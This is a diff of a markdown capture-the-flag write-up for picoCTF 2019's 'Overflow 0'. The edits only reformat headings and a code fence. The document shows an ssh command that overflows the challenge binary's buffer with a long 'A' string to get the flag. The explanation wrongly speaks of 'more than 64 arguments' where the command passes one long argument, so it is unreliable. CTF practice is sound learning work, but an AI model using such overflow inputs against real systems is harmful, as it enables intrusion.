@@ -92,14 +92,14 @@ print io.recv()
 ***
 ## OVERFLOW 0<a name="overflow0"></a>
 
-### > Problem
+> ### Problem
 >> This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in 
 >> /problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7 on the shell server. [source] ()
 
-## > Solution
+> ##  Solution
 >> After looking at the program, you can tell that it checks to see if `argv[]` is greater or less than the buffer. If it is, then it prints the flag file.
 >> So all we have to do is call `./vuln` with more than 64 arguments.
-~~~linux
+~~~bash
 kali@kali:~/ctf/pico/overflow0$ ssh User@2019shell1.picoctf.com 'cd /problems/
 overflow-0_1_54d12127b2833f7eab9758b43e88d3b7; ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
